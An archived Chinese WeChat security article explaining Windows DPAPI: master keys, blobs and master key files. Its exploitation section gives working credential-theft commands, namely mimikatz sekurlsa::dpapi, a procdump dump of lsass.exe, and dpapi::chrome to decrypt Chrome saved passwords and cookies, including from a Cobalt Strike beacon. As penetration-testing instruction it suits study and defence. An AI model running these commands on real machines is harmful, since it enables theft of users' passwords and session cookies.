<html>
<head>
<title>内网渗透DPAPI机制学习</title>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1.0,maximum-scale=1.0,user-scalable=0,viewport-fit=cover">
<style>
*{margin:0;padding:0;max-width:100%;box-sizing:border-box;}html{-ms-text-size-adjust:100%;-webkit-text-size-adjust:100%;line-height:1.6}img{z-index:999;position:relative;max-width:100%;margin:10px 0;}body{-webkit-touch-callout:none;font family:-apple-system-font,BlinkMacSystemFont,"Helvetica Neue","PingFang SC","Hiragino Sans GB","Microsoft YaHei UI","Microsoft YaHei",Arial,sans-serif;color:#333;letter-spacing:.034em}h1,h2,h3,h4,h5,h6{font-weight:400;font-size:16px;line-height:36px;}a{color:#576b95;text-decoration:none;-webkit-tap-highlight-color:rgba(0,0,0,0)}td,th{word-wrap:break-word;padding:5px 10px;border:1px solid #DDD;}table{margin-bottom:10px;border-collapse:collapse;display:table;width:100%!important;}.appmsg_skin_default .rich_media_area_primary{background-color:#fff}.appmsg_skin_default .rich_media_area_primary .weui-loadmore_line .weui-loadmore__tips{background-color:#fff}.rich_media_area_primary{padding:20px 16px 12px;background-color:#fafafa}@media (max-width:375px){.rich_media_area_primary{padding:20px 60px 15px 60px}.rich_media_area_extra{padding:0 60px 21px 60px}}@media (min-width:1024px){.rich_media_area_primary_inner,.rich_media_area_extra_inner,body{max-width:677px;margin-left:auto;margin-right:auto}.rich_media_area_primary{padding-top:32px}}.rich_media{padding:20px;}.appmsg_skin_default .rich_media_area_primary{background-color:#fff}.appmsg_skin_default .rich_media_area_primary .weui-loadmore_line .weui-loadmore__tips{background-color:#fff}@media screen and (min-width:1024px){.rich_media_area_primary_inner,.rich_media_area_extra_inner{max-width:677px;margin-left:auto;margin-right:auto}.rich_media_area_primary{padding-top:32px}}.rich_media_content{overflow:hidden;color:#333;font-size:17px;line-height:37px;;word-wrap:break-word;-webkit-hyphens:auto;-ms-hyphens:auto;hyphens:auto;text-align:justify;position:relative;z-index:0}.rich_media_content *{max-width:100%!important;box-sizing:border-box!important;-webkit-box-sizing:border-box!important;word-wrap:break-word!important}.rich_media_content p{clear:both;min-height:1em}.rich_media_content em{font-style:italic}.rich_media_content fieldset{min-width:0}.rich_media_content .list-paddingleft-1,.rich_media_content .list-paddingleft-2,.rich_media_content .list-paddingleft-3{padding-left:2.2em}.rich_media_content .list-paddingleft-1 .list-paddingleft-2,.rich_media_content .list-paddingleft-2 .list-paddingleft-2,.rich_media_content .list-paddingleft-3 .list-paddingleft-2{padding-left:30px}.rich_media_content .list-paddingleft-1{padding-left:1.2em}.rich_media_content .list-paddingleft-3{padding-left:3.2em}.rich_media_content .code-snippet,.rich_media_content .code-snippet__fix{max-width:1000%!important}.rich_media_content .code-snippet *,.rich_media_content .code-snippet__fix *{max-width:1000%!important}.rich_media_title{font-size:22px;line-height:42px;;line-height:1.4;margin:10px 0;padding-bottom:10px;border-bottom:1px solid #e7e7eb;}@supports(-webkit-overflow-scrolling:touch){.rich_media_title{font-weight:700}}.rich_media_meta{display:inline-block;vertical-align:middle;margin:0 10px 10px 0;font-size:15px;line-height:35px;;line-height:35px;;line-height:35px;;line-height:35px;;-webkit-tap-highlight-color:rgba(0,0,0,0)}.rich_media_meta.icon_appmsg_tag{margin-right:4px}.rich_media_meta.meta_tag_text{margin-right:0}.rich_media_meta_list em{font-style:normal}.rich_media_meta_text{color:rgba(0,0,0,0.3)}p{margin:0;}.msgBox{margin-top:20px;padding-top:20px;padding-left:50px;overflow:hidden;border-top:2px dashed #09a2ff;}.msg{padding-top:7px;clear:both;}.msgBody{float:right;width:100%;margin-left:55px;padding-bottom:15px;border-bottom:1px dashed #e0e0e0;}.userHeadImg{float:left;margin-left:-50px;}.userHeadImg img{width:40px;height:40px;margin-right:10px;border-radius:3px;}.userName{color:#888888;line-height:24px;font-size:14px;line-height:34px;;line-height:34px;;line-height:34px;;line-height:34px;;line-height:34px;;line-height:34px;;line-height:34px;;line-height:34px;;line-height:34px;;line-height:34px;;line-height:34px;;margin:5px 0 5px 0;height:24px;}.replyBody,.autherBody{color:#565656;font-size:15px;}.replyIcon{border-left:4px solid #33ab01;margin-right:5px;}.ad{text-decoration:none;color:#d6d4d4;font-size:12px;line-height:32px;;}.msgBodyReply{padding-top:5px;}.userName span{float:right;color:#afafaf;font-size:14px;}code{text-align:left;font-size:14px;display:block;white-space:pre;display:-webkit-box;display:-webkit-flex;display:flex;position:relative;}.code-snippet__fix{font-size:14px;margin:10px 0;display:block;color:#333;position:relative;background-color:rgba(0,0,0,0.03);border:1px solid #f0f0f0;border-radius:2px;display:-webkit-box;display:-webkit-flex;display:flex;padding-left:25px;line-height:26px}.code-snippet__fix code{text-align:left;font-size:14px;display:block;white-space:pre;display:-webkit-box;display:-webkit-flex;display:flex;position:relative;font family:Consolas,"Liberation Mono",Menlo,Courier,monospace}.code-snippet__comment,.code-snippet__quote{color:#afafaf;font-style:italic}.code-snippet__keyword,.code-snippet__selector-tag,.code-snippet__subst{color:#ca7d37}.code-snippet__number,.code-snippet__literal,.code-snippet__variable,.code-snippet__template-variable,.code-snippet__tag .code-snippet__attr{color:#0e9ce5}.code-snippet__string,.code-snippet__doctag{color:#d14}.code-snippet__title,.code-snippet__section,.code-snippet__selector-id{color:#d14}.code-snippet__subst{font-weight:normal}.code-snippet__type,.code-snippet__class .code-snippet__title{color:#0e9ce5}.code-snippet__tag,.code-snippet__name,.code-snippet__attribute{color:#0e9ce5;font-weight:normal}.code-snippet__regexp,.code-snippet__link{color:#ca7d37}.code-snippet__symbol,.code-snippet__bullet{color:#d14}.code-snippet__built_in,.code-snippet__builtin-name{color:#ca7d37}.code-snippet__meta{color:#afafaf}.code-snippet__deletion{background:#fdd}.code-snippet__addition{background:#dfd}.code-snippet__emphasis{font-style:italic}.code-snippet__strong{font-weight:bold}.account_avatar{width:40px;height:40px;padding:0;}.account_info{display:-webkit-box;display:-webkit-flex;display:flex;-webkit-box-align:center;-webkit-align-items:center;padding:20px 0;align-items:center}.flex_bd{padding-left:14px;}.account_nickname{display:inline-block;vertical-align:middle;line-height:1.2;color:#576b95;font-size:14px}.account_desc{overflow:hidden;text-overflow:ellipsis;display:-webkit-box;-webkit-box-orient:vertical;-webkit-line-clamp:1;color:rgba(0,0,0,0.3);font-size:14px;line-height:1.2;padding-top:.4em}.msg_source_url{text-align:left;word-break:break-all;margin-top:20px;}.msg_source_url a{padding-right:10px;}.msg_source_url .url_text{color:#a8a8a8;}.video-desc{font-size:14px;margin-top:15px;color:#6c6c6c;}.msg_source_url{text-align:left;}.original_primary_card_tips{color:rgba(0,0,0,0.3);line-height:1.4;font-size:15px;}.weui-flex__item{margin-bottom:20px;padding:20px 16px;margin-top:16px;line-height:1.4;align-items:center;background-color:#f7f7f7;border-radius:8px;position:relative;}.original_primary_desc{color:rgba(0,0,0,0.5);font-size:14px;padding-top:4px;width:auto;overflow:hidden;text-overflow:ellipsis;}.msgBodyReplyList{border-top:1px solid #e1e1e1;margin-top:10px;}.msgBodyReplyListTop{border-top:0;}.reply_like_num{float:right;font-size:14px;color:#c7c7c7;}.msgData{margin-top:20px;color:#626262;}.msgData span{font-size:14px;padding-right:15px;}.msgData .likes{float:right;padding-right:0;}.js_text_content p{font-size:18px;line-height:38px;;}.rich_media_meta_link{font-size:15px;}blockquote {padding-left: 10px;border-left: 3px solid #dbdbdb;color: rgba(0,0,0,0.5);font-size:15px;line-height:35px;;padding-top: 4px;margin: 1em 0;}.video_iframe{width:500px;height:400px;}.blockquote_info{color:#b5b5b5;margin-top:10px;}.playVideoWx{position:relative;display:block;}.icon_mid_play{position:absolute;z-index:9999;top:50%;left:50%;display:-webkit-box;display:-webkit-flex;display:flex;-webkit-box-align:center;-webkit-align-items:center;align-items:center;-webkit-box-pack:center;-webkit-justify-content:center;justify-content:center;width:48px;height:48px;background:rgba(237,237,237,0.9);border-radius:50%}.icon_mid_play:before{content:"";text-indent:-999em;display:inline-block;width:28px;height:28px;vertical-align:middle;background-size:cover;background-image:url("data:image/svg+xml;charset=utf8,%3Csvg xmlns='http://www.w3.org/2000/svg' width='24' height='24' viewBox='0 0 24 24'%3E  %3Cpath fill='%23151515' fill-rule='evenodd' d='M9.524 4.938l10.092 6.21a1 1 0 0 1 0 1.704l-10.092 6.21A1 1 0 0 1 8 18.21V5.79a1 1 0 0 1 1.524-.852z'/%3E%3C/svg%3E")}
</style>
<link href="https://www.juyifx.cn/config/css/wxArticle.css" rel="stylesheet"/>
</head>
<body>
<div class="rich_media">
                
                <h1 class="rich_media_title" id="activity-name">
                    
                    
                    
内网渗透 | DPAPI机制学习
                </h1>
                <div id="meta_content" class="rich_media_meta_list">
                                                                <span id="copyright_logo" class="rich_media_meta icon_appmsg_tag appmsg_title_tag weui-wa-hotarea">原创</span>
                                                                                            <span class="rich_media_meta rich_media_meta_text">
                                                                    HopeVenus
                                                            </span>
                                                                
                                        <span class="rich_media_meta rich_media_meta_nickname" id="profileBt">
                      <a href="javascript:void(0);" class=" weui-wa-hotarea" id="js_name">
                        HACK学习呀                      </a>
                      <div id="js_profile_qrcode" class="profile_container" style="display:none;">
                          <div class="profile_inner">
                              <strong class="profile_nickname">HACK学习呀</strong>
                              

                              <p class="profile_meta">
                              <label class="profile_meta_label">微信号</label>
                              <span class="profile_meta_value">Hacker1961X</span>
                              </p>

                              <p class="profile_meta">
                              <label class="profile_meta_label">功能介绍</label>
                              <span class="profile_meta_value">HACK学习，专注于互联网安全与黑客精神；渗透测试，社会工程学，Python黑客编程，资源分享，Web渗透培训，电脑技巧，渗透技巧等，为广大网络安全爱好者一个交流分享学习的平台！</span>
                              </p>
                              
                          </div>
                          <span class="profile_arrow_wrp" id="js_profile_arrow_wrp">
                              <i class="profile_arrow arrow_out"></i>
                              <i class="profile_arrow arrow_in"></i>
                          </span>
                      </div>
                    </span>
                    <em id="publish_time" class="rich_media_meta rich_media_meta_text">2021-04-29</em>
                </div>

                
                                                <div id="js_tags"  class="article-tag__list" style="display: none;" data-len="0">
                                            
                        <div class="article-tag-card__title">收录于话题</div>
                        <div class="article-tags">
                                                    </div>
                                    </div><div id="weixin_content"><p data-mpa-powered-by="yiban.io"><span style="font-size:17px;line-height:37px;;"><strong>0x00 前言</strong></span></p><p><span style="font-size:15px;line-height:35px;;">&nbsp;</span></p><p><span style="font-size:15px;line-height:35px;;">绝大多数应用程序都有数据加密保护的需求，存储和保护私密信息最安全的方式就是每次需要加密或解密时都从用户那里得到密码，使用后再丢弃。这种方式每次处理信息时都需要用户输入口令，对于绝大多数用户来说，这种方式是不可取的。因为这要求用户记住很多信息，而用户一般会反复使用同一个密码，从而降低系统的安全性和可用性。因此需要一种加密机制，再不需要用户输入任何信息的情况下也能存储秘密数据，而微软数据保护接口（Data Protection Application Programming Interface，DPAPI）便是满足这种要求的程序接口。</span></p><p><span style="font-size:15px;line-height:35px;;">&nbsp;</span></p><p><span style="font-size:15px;line-height:35px;;">从 Windows 2000 开始，用户程序或操作系统程序就可以直接调用 DPAPI 来加密数据。由于 DPAPI 简单易用且加密强大，大量应用程序都采用 DPAPI 加密用户的私密数据，如 Chrome 浏览器的自动登陆密码、远程桌面的自动登陆密码、Outlook邮箱的账号密码、加密文件系统的私钥等。DPAPI 内部加密流程异常复杂而且微软官方也未公布过其内部细节，这给理解该接口内部实现机制带来了极大困难。</span></p><p><span style="font-size:15px;line-height:35px;;">&nbsp;</span></p><h1><strong><span style="font-size:17px;line-height:37px;;">0x01 何为DPAPI</span></strong></h1><p><span style="font-size:15px;line-height:35px;;">&nbsp;</span></p><p><span style="font-size:15px;line-height:35px;;">DPAPI 英文全称：Data Protection API ，顾名思义就是用来保护数据的接口。这个接口在windows中大量的使用来加密数据，比如chrome的cookies和login data。</span></p><p><span style="font-size:15px;line-height:35px;;">&nbsp;</span></p><p><span style="font-size:15px;line-height:35px;;">1.DPAPI 使用了叫做Master Key的东西，用来解密和加密。Master Key 并不会存在在磁盘上，是通过用户的密码HASH加密生成。</span></p><p><span style="font-size:15px;line-height:35px;;">&nbsp;</span></p><p><span style="font-size:15px;line-height:35px;;">2.Master Key 的第一种实现方式用用户NTLM Hash来加密。由于NTLM Hash在Windows中有着各种重要的作用，而且NTLM Hash是存储在SAM文件中，只要攻击者获取到Hash就可以用来生成Master Key来解密数据了。所以为了防止这样的事，就有了第二种：直接用用户密码生成，函数：SHA‑1(UTF16LE(user_password))&nbsp;。</span></p><p><span style="font-size:15px;line-height:35px;;">&nbsp;</span></p><p><span style="font-size:15px;line-height:35px;;">就算攻击者获取到NTLM，如果不能解密出用户的密码不能生成Master Key。</span></p><p><span style="font-size:15px;line-height:35px;;">&nbsp;</span></p><h1><strong><span style="font-size:17px;line-height:37px;;">0x02 DPAPI的原理</span></strong></h1><p><span style="font-size:15px;line-height:35px;;">&nbsp;</span></p><p><span style="font-size:15px;line-height:35px;;">使用简单，加密使用函数CryptProtectData，解密使用函数CryptUnprotectData即可，系统在后台自动完成其他复杂的加解密操作</span></p><p><span style="font-size:15px;line-height:35px;;">&nbsp;</span></p><p><span style="font-size:15px;line-height:35px;;">CryptProtectData的说明可参考：</span></p><p><span style="font-size:15px;line-height:35px;;">&nbsp;</span></p><p><span style="font-size:15px;line-height:35px;;color: rgb(255, 104, 39);">https://msdn.microsoft.com/en-us/library/windows/desktop/aa380261(v=vs.85).aspx</span></p><p><span style="font-size:15px;line-height:35px;;">&nbsp;</span></p><p><span style="font-size:15px;line-height:35px;;">CryptUnprotectData的说明可参考：</span></p><p><span style="font-size:15px;line-height:35px;;">&nbsp;</span></p><p><span style="font-size:15px;line-height:35px;;color: rgb(255, 104, 39);">https://msdn.microsoft.com/en-us/library/windows/desktop/aa380882(v=vs.85).aspx</span></p><p><span style="font-size:15px;line-height:35px;;">&nbsp;</span></p><h2><span style="font-size:15px;line-height:35px;;">专有名词</span></a></h2><p><span style="font-size:15px;line-height:35px;;">&nbsp;</span></p><p><span style="font-size:15px;line-height:35px;;"><strong>DPAPI blob：</strong></span></p><p><span style="font-size:15px;line-height:35px;;">&nbsp;</span></p><p><span style="font-size:15px;line-height:35px;;">一段密文，可使用Master Key对其解密</span></p><p><span style="font-size:15px;line-height:35px;;">&nbsp;</span></p><p><span style="font-size:15px;line-height:35px;;">结构如下图</span></p><p><span style="font-size:15px;line-height:35px;;">&nbsp;</span></p><p><img data-ratio="0.7872670807453416" src="图片/HACK学习呀_2021-04-29_内网渗透DPAPI机制学习/1_eiarRCbW4OdzR8W92QTJQMEicWgCYg.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8QfeuvouicuVIl2KTKnh9qL24udmIQpD6Gy7sIvksaOtSkJicl4XV8QAL7eiarRCbW4OdzR8W92QTJQMEicWgCYg/640?wx_fmt=png'" data-type="png" data-w="644"  /></p><p><span style="font-size:15px;line-height:35px;;">&nbsp;</span></p><p><span style="font-size:15px;line-height:35px;;"><strong>Master Key：</strong></span></p><p><span style="font-size:15px;line-height:35px;;">&nbsp;</span></p><p><span style="font-size:15px;line-height:35px;;">64字节，用于解密DPAPI blob</span></p><p><span style="font-size:15px;line-height:35px;;">&nbsp;</span></p><p><span style="font-size:15px;line-height:35px;;">通过用户登录密码、SID和16字节随机数加密后保存在Master Key file中</span></p><p><span style="font-size:15px;line-height:35px;;">&nbsp;</span></p><p><span style="font-size:15px;line-height:35px;;"><strong>Master Key file：</strong></span></p><p><span style="font-size:15px;line-height:35px;;">&nbsp;</span></p><p><span style="font-size:15px;line-height:35px;;">二进制文件，可使用用户登录密码对其解密，获得Master Key</span></p><p><span style="font-size:15px;line-height:35px;;">&nbsp;</span></p><p><span style="font-size:15px;line-height:35px;;">包含以下五个部分：</span></p><p><span style="font-size:15px;line-height:35px;;">&nbsp;</span></p><p><span style="font-size:15px;line-height:35px;;">Header and system information</span></p><p><span style="font-size:15px;line-height:35px;;">User’s Master Key</span></p><p><span style="font-size:15px;line-height:35px;;">Local backup encryption key</span></p><p><span style="font-size:15px;line-height:35px;;">Unique CREDHIST file identifier</span></p><p><span style="font-size:15px;line-height:35px;;">Domain Master Key backup</span></p><p><span style="font-size:15px;line-height:35px;;">&nbsp;</span></p><p><span style="font-size:15px;line-height:35px;;">位于固定位置：&nbsp;%APPDATA%\Microsoft\Protect\%SID%</span></p><p><span style="font-size:15px;line-height:35px;;">&nbsp;</span></p><p><span style="font-size:15px;line-height:35px;;">例如：</span></p><p><br  /></p><section class="code-snippet__fix code-snippet__js"><ul class="code-snippet__line-index code-snippet__js"><li></li></ul><pre class="code-snippet__js" data-lang="makefile"><code><span class="code-snippet_outer"><span class="code-snippet__section">C:\Users\a\AppData\Roaming\Microsoft\Protect\S-1-5-21-3453529135-4164765056-1075703908-1001</span></span></code></pre></section><p><span style="font-size:15px;line-height:35px;;">&nbsp;</span><br  /></p><p><span style="font-size:15px;line-height:35px;;">包含文件329c4147-0011-4ad6-829d-e32dcbd1bbd7(系统文件，隐藏属性)</span></p><p><span style="font-size:15px;line-height:35px;;">&nbsp;</span></p><p><span style="font-size:15px;line-height:35px;;">无法直接查看</span></p><p><span style="font-size:15px;line-height:35px;;">&nbsp;</span></p><p><span style="font-size:15px;line-height:35px;;">可通过mimikatz对其解析，命令如下：</span></p><p><span style="font-size:15px;line-height:35px;;"></span></p><section class="code-snippet__fix code-snippet__js"><ul class="code-snippet__line-index code-snippet__js"><li></li></ul><pre class="code-snippet__js" data-lang="bash"><code><span class="code-snippet_outer">mimikatz.exe&nbsp;<span class="code-snippet__built_in">log</span>&nbsp;<span class="code-snippet__string">"dpapi::masterkey&nbsp;/in:"</span>329c4147-0011-4ad6-829d-e32dcbd1bbd7<span class="code-snippet__string">"</span></span></code></pre></section><p><span style="font-size:15px;line-height:35px;;"></span><br  /></p><h1><span style="font-size:17px;line-height:37px;;"><strong>0x03 DPAPI的利用</strong></span></h1><p><span style="font-size:15px;line-height:35px;;">&nbsp;</span></p><h2><span style="font-size:15px;line-height:35px;;">1.获得MasterKey的方法</span></h2><p><span style="font-size:15px;line-height:35px;;">&nbsp;</span></p><h3><span style="font-size:15px;line-height:35px;;">1、在线获取</span></h3><p><span style="font-size:15px;line-height:35px;;"></span></p><section class="code-snippet__fix code-snippet__js"><ul class="code-snippet__line-index code-snippet__js"><li></li><li></li></ul><pre class="code-snippet__js" data-lang="cpp"><code><span class="code-snippet_outer">privilege::debug</span></code><code><span class="code-snippet_outer">sekurlsa::dpapi</span></code></pre></section><p><span style="font-size:15px;line-height:35px;;">&nbsp;</span></p><p><img data-ratio="0.5962219598583235" src="图片/HACK学习呀_2021-04-29_内网渗透DPAPI机制学习/2_lIyKrPvnADicEv0fBm2NmaeaM9X9DQ.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8QfeuvouicuVIl2KTKnh9qL24udmIQp3UolaZia4ppzJlbzic5qfBBaU25lIyKrPvnADicEv0fBm2NmaeaM9X9DQ/640?wx_fmt=png'" data-type="png" data-w="847"  /></p><p><span style="font-size:15px;line-height:35px;;">&nbsp;</span></p><h3><span style="font-size:15px;line-height:35px;;">2、离线读取</span></h3><p><span style="font-size:15px;line-height:35px;;">&nbsp;</span></p><p><span style="font-size:15px;line-height:35px;;">使用procdump dump出lsass.exe进程内存</span></p><p><span style="font-size:15px;line-height:35px;;">&nbsp;</span></p><p><span style="font-size:15px;line-height:35px;;">管理员权限：</span></p><p><span style="font-size:15px;line-height:35px;;">&nbsp;</span></p><section class="code-snippet__fix code-snippet__js"><ul class="code-snippet__line-index code-snippet__js"><li></li></ul><pre class="code-snippet__js" data-lang="css"><code><span class="code-snippet_outer"><span class="code-snippet__selector-tag">procdump</span><span class="code-snippet__selector-class">.exe</span> <span class="code-snippet__selector-tag">-accepteula</span> <span class="code-snippet__selector-tag">-ma</span> <span class="code-snippet__selector-tag">lsass</span><span class="code-snippet__selector-class">.exe</span> <span class="code-snippet__selector-tag">lsass</span><span class="code-snippet__selector-class">.dmp</span></span></code></pre></section><p><span style="font-size:15px;line-height:35px;;">&nbsp;</span><br  /></p><p><span style="font-size:15px;line-height:35px;;">使用mimikatz加载dmp文件并获取各个Master Key file对应的MasterKey：</span></p><p><span style="font-size:15px;line-height:35px;;"></span></p><section class="code-snippet__fix code-snippet__js"><ul class="code-snippet__line-index code-snippet__js"><li></li><li></li></ul><pre class="code-snippet__js" data-lang="css"><code><span class="code-snippet_outer"><span class="code-snippet__selector-tag">sekurlsa</span><span class="code-snippet__selector-pseudo">::minidump</span> <span class="code-snippet__selector-tag">lsass</span><span class="code-snippet__selector-class">.dmp</span></span></code><code><span class="code-snippet_outer"><span class="code-snippet__selector-tag">sekurlsa</span><span class="code-snippet__selector-pseudo">::dpapi</span></span></code></pre></section><p><span style="font-size:15px;line-height:35px;;"></span><br  /></p><h2><span style="font-size:15px;line-height:35px;;">2.Chrome Cookies</span></h2><p><span style="font-size:15px;line-height:35px;;">&nbsp;</span></p><p><span style="font-size:15px;line-height:35px;;">本地用户登录时，解密Cookies：</span></p><p><span style="font-size:15px;line-height:35px;;"></span></p><section class="code-snippet__fix code-snippet__js"><ul class="code-snippet__line-index code-snippet__js"><li></li></ul><pre class="code-snippet__js" data-lang="perl"><code><span class="code-snippet_outer">&nbsp;dpapi::chrome&nbsp;/in:<span class="code-snippet__string">"%localappdata%GoogleChromeUser&nbsp;DataDefaultCookies"</span>&nbsp;/unprotect</span></code></pre></section><p><span style="font-size:15px;line-height:35px;;"></span><br  /></p><p><span style="font-size:15px;line-height:35px;;">这里只支持Chrome 80以下版本，但是我虚拟机安的是80以上的版本，所以显示拒绝访问</span></p><p><span style="font-size:15px;line-height:35px;;">&nbsp;</span></p><p><img data-ratio="0.48812351543942994" src="图片/HACK学习呀_2021-04-29_内网渗透DPAPI机制学习/3_fum3svTXef53QEJuHDcvSphzJUCykg.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8QfeuvouicuVIl2KTKnh9qL24udmIQp4Lia8R8NmKqA8icBfex4MicMEeIfum3svTXef53QEJuHDcvSphzJUCykg/640?wx_fmt=png'" data-type="png" data-w="842"  /></p><p><span style="font-size:15px;line-height:35px;;">&nbsp;</span></p><p><span style="font-size:15px;line-height:35px;;">上cs4.2直接基于 beacon 操作无需管理权限，可直接忽略 Chrome 80 之后版本由于换了加密算法而无法解密的问题</span></p><p><span style="font-size:15px;line-height:35px;;">&nbsp;</span></p><section class="code-snippet__fix code-snippet__js"><ul class="code-snippet__line-index code-snippet__js"><li></li><li></li></ul><pre class="code-snippet__js" data-lang="shell"><code><span class="code-snippet_outer"><span style="font-size:15px;line-height:35px;;">beacon&gt; mimikatz dpapi::chrome /in:"%localappdata%\Google\Chrome\User Data\Default\Login Data" /unprotect</span></span></code><code><span class="code-snippet_outer"><span style="font-size:15px;line-height:35px;;">beacon&gt; mimikatz dpapi::chrome /in:"%localappdata%\Google\Chrome\User Data\Default\Cookies" /unprotect</span></span></code></pre></section><p><span style="font-size:15px;line-height:35px;;">&nbsp;<br  /></span></p><p><img data-ratio="0.6268509378084897" src="图片/HACK学习呀_2021-04-29_内网渗透DPAPI机制学习/4_cJ15bCzyxIVdiaYfseJHcfkUiaxaSw.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8QfeuvouicuVIl2KTKnh9qL24udmIQpiamq0dTx6fyW6Cl3Nz7usjybUehcJ15bCzyxIVdiaYfseJHcfkUiaxaSw/640?wx_fmt=png'" data-type="png" data-w="1013"  /></p><p><span style="font-size:15px;line-height:35px;;">&nbsp;</span></p><h1><span style="font-size:17px;line-height:37px;;"><strong>0x04 后记</strong></span></h1><p><span style="font-size:15px;line-height:35px;;"><strong>&nbsp;</strong></span></p><p><span style="font-size:15px;line-height:35px;;">如果用户sid文件夹下包含多个Master Key file，使用Windows Password Recovery尝试解密时，需要逐个测试，也可通过读取文件Preferred的前16字节获得对应的Master Key file</span></p><p><span style="font-size:15px;line-height:35px;;">&nbsp;</span></p><p><span style="font-size:15px;line-height:35px;;">而且也无法使用用户登录密码的NTLM hash解密Master Key，目前版本的DPAPI在设计上考虑到了这个隐患，使用SHA1算法(NTLM hash使用MD4加密)。所以说，无法使用用户登录密码的NTLM hash解密Master Key</span></p><p><br  /></p><p data-darkmode-bgcolor-15976329806349="rgb(25, 25, 25)" data-darkmode-original-bgcolor-15976329806349="rgb(255, 255, 255)" data-style="font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif; letter-spacing: 0.544px; white-space: normal; background-color: rgb(255, 255, 255); color: rgb(163, 163, 163) !important;" class="js_darkmode__0" data-darkmode-bgcolor-16121018536955="rgb(25, 25, 25)" data-darkmode-original-bgcolor-16121018536955="#fff|rgb(255, 255, 255)" data-darkmode-color-16121018536955="rgb(163, 163, 163)" data-darkmode-original-color-16121018536955="#fff|rgb(163, 163, 163)" style="font family: -apple-system, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.544px;white-space: normal;background-color: rgb(255, 255, 255);"><img data-type="png" data-ratio="0.109375" data-w="640" src="图片/HACK学习呀_2021-04-29_内网渗透DPAPI机制学习/5_rsSo8PwNYlT1XzZ6fbwQuXBRKf4j3Q.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/ndicuTO22p6ibN1yF91ZicoggaJJZX3vQ77Vhx81O5GRyfuQoBRjpaUyLOErsSo8PwNYlT1XzZ6fbwQuXBRKf4j3Q/640?wx_fmt=png'" style="box-sizing: border-box !important;visibility: visible !important;width: 640px !important;"  /></p><p data-darkmode-bgcolor-15976329806349="rgb(25, 25, 25)" data-darkmode-original-bgcolor-15976329806349="rgb(255, 255, 255)" data-style="font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif; letter-spacing: 0.544px; white-space: normal; background-color: rgb(255, 255, 255); text-align: center; color: rgb(163, 163, 163) !important;" class="js_darkmode__1" data-darkmode-bgcolor-16121018536955="rgb(25, 25, 25)" data-darkmode-original-bgcolor-16121018536955="#fff|rgb(255, 255, 255)" data-darkmode-color-16121018536955="rgb(163, 163, 163)" data-darkmode-original-color-16121018536955="#fff|rgb(163, 163, 163)" style="font family: -apple-system, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.544px;white-space: normal;background-color: rgb(255, 255, 255);"><br data-darkmode-bgcolor-16121018536955="rgb(25, 25, 25)" data-darkmode-original-bgcolor-16121018536955="#fff|rgb(255, 255, 255)" data-darkmode-color-16121018536955="rgb(163, 163, 163)" data-darkmode-original-color-16121018536955="#fff|rgb(163, 163, 163)"  /></p><p data-darkmode-bgcolor-15976329806349="rgb(25, 25, 25)" data-darkmode-original-bgcolor-15976329806349="rgb(255, 255, 255)" data-style="font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif; letter-spacing: 0.544px; white-space: normal; background-color: rgb(255, 255, 255); text-align: center; color: rgb(163, 163, 163) !important;" class="js_darkmode__2" data-darkmode-bgcolor-16121018536955="rgb(25, 25, 25)" data-darkmode-original-bgcolor-16121018536955="#fff|rgb(255, 255, 255)" data-darkmode-color-16121018536955="rgb(163, 163, 163)" data-darkmode-original-color-16121018536955="#fff|rgb(163, 163, 163)" style="font family: -apple-system, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.544px;white-space: normal;background-color: rgb(255, 255, 255);text-align: center;"><strong>推荐阅读：</strong></p><p data-darkmode-bgcolor-15976329806349="rgb(25, 25, 25)" data-darkmode-original-bgcolor-15976329806349="rgb(255, 255, 255)" data-style="font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif; letter-spacing: 0.544px; white-space: normal; background-color: rgb(255, 255, 255); text-align: center; color: rgb(163, 163, 163) !important;" class="js_darkmode__4" data-darkmode-bgcolor-16121018536955="rgb(25, 25, 25)" data-darkmode-original-bgcolor-16121018536955="#fff|rgb(255, 255, 255)" data-darkmode-color-16121018536955="rgb(163, 163, 163)" data-darkmode-original-color-16121018536955="#fff|rgb(163, 163, 163)" style="font family: -apple-system, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.544px;white-space: normal;background-color: rgb(255, 255, 255);"><br  /></p><p style="font family: -apple-system, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.544px;white-space: 